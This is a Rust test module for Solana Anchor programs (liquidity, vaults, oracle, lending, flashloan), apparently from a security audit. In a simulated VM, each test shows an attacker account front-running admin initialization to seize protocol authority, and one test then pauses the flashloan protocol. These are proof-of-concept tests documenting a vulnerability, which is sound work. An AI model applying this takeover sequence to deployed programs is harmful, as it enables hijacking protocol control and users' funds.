#[cfg(test)]
mod tests {
    use crate::{
        lending::fixture::LendingFixture,
        liquidity::fixture::{LiquidityFixture, LIQUIDITY_PROGRAM_ID},
        vaults::fixture::{VaultFixture, ORACLE_PROGRAM_ID, VAULTS_PROGRAM_ID},
    };
    use anchor_lang::{prelude::*, InstructionData, ToAccountMetas};
    use fluid_test_framework::{helpers::BaseFixture, prelude::*};
    use solana_sdk::{instruction::Instruction, signer::Signer};

    const FLASHLOAN_PROGRAM_ID: Pubkey = flashloan::ID;

    #[test]
    fn liquidity_admin_can_be_frontrun() {
        let mut fixture = LiquidityFixture::new().expect("Failed to create liquidity fixture");
        let attacker = fixture.vm.make_account(10_000 * LAMPORTS_PER_SOL);
        let legitimate_admin = fixture.admin.pubkey();

        let attacker_init_ix =
            fixture.init_liquidity_ix(&attacker.pubkey(), &attacker.pubkey(), &attacker.pubkey());
        fixture.vm.prank(attacker.pubkey());
        fixture
            .vm
            .execute_as_prank(attacker_init_ix)
            .expect("Attacker should be able to initialize liquidity");

        let legit_init_ix =
            fixture.init_liquidity_ix(&legitimate_admin, &legitimate_admin, &legitimate_admin);
        fixture.vm.prank(legitimate_admin);
        let legit_result = fixture.vm.execute_as_prank(legit_init_ix);
        assert!(
            legit_result.is_err(),
            "Legitimate admin re-init should fail once attacker initializes PDA"
        );

        let liquidity = fixture.read_liquidity().expect("Failed to read liquidity");
        let auth_list = fixture.read_auth_list().expect("Failed to read auth list");

        assert_eq!(liquidity.authority, attacker.pubkey());
        assert_eq!(liquidity.revenue_collector, attacker.pubkey());
        assert!(auth_list.auth_users.contains(&attacker.pubkey()));
    }

    #[test]
    fn vault_admin_can_be_frontrun() {
        let mut fixture = VaultFixture::new().expect("Failed to create vault fixture");
        let attacker = fixture.liquidity.vm.make_account(10_000 * LAMPORTS_PER_SOL);
        let legitimate_admin = fixture.liquidity.admin.pubkey();
        let vault_admin_pda = fixture.get_vault_admin();

        let attacker_init_ix = Instruction {
            program_id: VAULTS_PROGRAM_ID,
            accounts: vaults::accounts::InitVaultAdmin {
                signer: attacker.pubkey(),
                vault_admin: vault_admin_pda,
                system_program: system_program::ID,
            }
            .to_account_metas(None),
            data: vaults::instruction::InitVaultAdmin {
                liquidity: LIQUIDITY_PROGRAM_ID,
                authority: attacker.pubkey(),
            }
            .data(),
        };

        fixture.liquidity.vm.prank(attacker.pubkey());
        fixture
            .liquidity
            .vm
            .execute_as_prank(attacker_init_ix)
            .expect("Attacker should be able to initialize vault admin");

        let legit_init_ix = Instruction {
            program_id: VAULTS_PROGRAM_ID,
            accounts: vaults::accounts::InitVaultAdmin {
                signer: legitimate_admin,
                vault_admin: vault_admin_pda,
                system_program: system_program::ID,
            }
            .to_account_metas(None),
            data: vaults::instruction::InitVaultAdmin {
                liquidity: LIQUIDITY_PROGRAM_ID,
                authority: legitimate_admin,
            }
            .data(),
        };

        fixture.liquidity.vm.prank(legitimate_admin);
        let legit_result = fixture.liquidity.vm.execute_as_prank(legit_init_ix);
        assert!(legit_result.is_err(), "Legitimate vault admin init should fail");

        let vault_admin = fixture
            .liquidity
            .vm
            .read_anchor_account::<vaults::state::VaultAdmin>(&vault_admin_pda)
            .expect("Failed to read vault admin");
        assert_eq!(vault_admin.authority, attacker.pubkey());
        assert!(vault_admin.auths.contains(&attacker.pubkey()));
    }

    #[test]
    fn oracle_admin_can_be_frontrun() {
        let mut fixture = VaultFixture::new().expect("Failed to create vault fixture");
        let attacker = fixture.liquidity.vm.make_account(10_000 * LAMPORTS_PER_SOL);
        let legitimate_admin = fixture.liquidity.admin.pubkey();
        let oracle_admin_pda = fixture.get_oracle_admin();

        let attacker_init_ix = Instruction {
            program_id: ORACLE_PROGRAM_ID,
            accounts: oracle::accounts::InitAdmin {
                signer: attacker.pubkey(),
                oracle_admin: oracle_admin_pda,
                system_program: system_program::ID,
            }
            .to_account_metas(None),
            data: oracle::instruction::InitAdmin {
                authority: attacker.pubkey(),
            }
            .data(),
        };

        fixture.liquidity.vm.prank(attacker.pubkey());
        fixture
            .liquidity
            .vm
            .execute_as_prank(attacker_init_ix)
            .expect("Attacker should be able to initialize oracle admin");

        let legit_init_ix = Instruction {
            program_id: ORACLE_PROGRAM_ID,
            accounts: oracle::accounts::InitAdmin {
                signer: legitimate_admin,
                oracle_admin: oracle_admin_pda,
                system_program: system_program::ID,
            }
            .to_account_metas(None),
            data: oracle::instruction::InitAdmin {
                authority: legitimate_admin,
            }
            .data(),
        };

        fixture.liquidity.vm.prank(legitimate_admin);
        let legit_result = fixture.liquidity.vm.execute_as_prank(legit_init_ix);
        assert!(legit_result.is_err(), "Legitimate oracle admin init should fail");

        let oracle_admin = fixture
            .liquidity
            .vm
            .read_anchor_account::<oracle::state::OracleAdmin>(&oracle_admin_pda)
            .expect("Failed to read oracle admin");
        assert_eq!(oracle_admin.authority, attacker.pubkey());
        assert!(oracle_admin.auths.contains(&attacker.pubkey()));
    }

    #[test]
    fn lending_admin_can_be_frontrun() {
        let mut fixture = LendingFixture::new().expect("Failed to create lending fixture");
        let attacker = fixture.vm().make_account(10_000 * LAMPORTS_PER_SOL);
        let legitimate_admin = fixture.admin.pubkey();

        let attacker_init_ix =
            fixture.init_lending_admin_ix(&attacker.pubkey(), &attacker.pubkey(), &attacker.pubkey());
        fixture.vm().prank(attacker.pubkey());
        fixture
            .vm()
            .execute_as_prank(attacker_init_ix)
            .expect("Attacker should be able to initialize lending admin");

        let legit_init_ix =
            fixture.init_lending_admin_ix(&legitimate_admin, &legitimate_admin, &legitimate_admin);
        fixture.vm().prank(legitimate_admin);
        let legit_result = fixture.vm().execute_as_prank(legit_init_ix);
        assert!(legit_result.is_err(), "Legitimate lending admin init should fail");

        let lending_admin_pda = fixture.get_lending_admin();
        let lending_admin = fixture
            .vm()
            .read_anchor_account::<lending::state::LendingAdmin>(&lending_admin_pda)
            .expect("Failed to read lending admin");
        assert_eq!(lending_admin.authority, attacker.pubkey());
        assert!(lending_admin.auths.contains(&attacker.pubkey()));
    }

    #[test]
    fn flashloan_admin_can_be_frontrun() {
        let mut fixture = LiquidityFixture::new().expect("Failed to create liquidity fixture");
        let flashloan_program_path = BaseFixture::find_program_path("flashloan.so")
            .expect("flashloan.so not found. Run anchor build first");
        fixture
            .vm
            .add_program_from_file(&FLASHLOAN_PROGRAM_ID, &flashloan_program_path)
            .expect("Failed to load flashloan program");

        let attacker = fixture.vm.make_account(10_000 * LAMPORTS_PER_SOL);
        let legitimate_admin = fixture.admin.pubkey();
        let flashloan_admin_pda =
            Pubkey::find_program_address(&[b"flashloan_admin"], &FLASHLOAN_PROGRAM_ID).0;

        let attacker_init_ix = Instruction {
            program_id: FLASHLOAN_PROGRAM_ID,
            accounts: flashloan::accounts::InitFlashloanAdmin {
                signer: attacker.pubkey(),
                flashloan_admin: flashloan_admin_pda,
                system_program: system_program::ID,
            }
            .to_account_metas(None),
            data: flashloan::instruction::InitFlashloanAdmin {
                authority: attacker.pubkey(),
                flashloan_fee: 0,
                liquidity_program: LIQUIDITY_PROGRAM_ID,
            }
            .data(),
        };

        fixture.vm.prank(attacker.pubkey());
        fixture
            .vm
            .execute_as_prank(attacker_init_ix)
            .expect("Attacker should be able to initialize flashloan admin");

        let legit_init_ix = Instruction {
            program_id: FLASHLOAN_PROGRAM_ID,
            accounts: flashloan::accounts::InitFlashloanAdmin {
                signer: legitimate_admin,
                flashloan_admin: flashloan_admin_pda,
                system_program: system_program::ID,
            }
            .to_account_metas(None),
            data: flashloan::instruction::InitFlashloanAdmin {
                authority: legitimate_admin,
                flashloan_fee: 0,
                liquidity_program: LIQUIDITY_PROGRAM_ID,
            }
            .data(),
        };

        fixture.vm.prank(legitimate_admin);
        let legit_result = fixture.vm.execute_as_prank(legit_init_ix);
        assert!(legit_result.is_err(), "Legitimate flashloan admin init should fail");

        let attacker_pause_ix = Instruction {
            program_id: FLASHLOAN_PROGRAM_ID,
            accounts: flashloan::accounts::FlashloanProtocol {
                authority: attacker.pubkey(),
                flashloan_admin: flashloan_admin_pda,
            }
            .to_account_metas(None),
            data: flashloan::instruction::PauseProtocol {}.data(),
        };
        fixture.vm.prank(attacker.pubkey());
        fixture
            .vm
            .execute_as_prank(attacker_pause_ix)
            .expect("Attacker should control flashloan admin authority");
    }
}
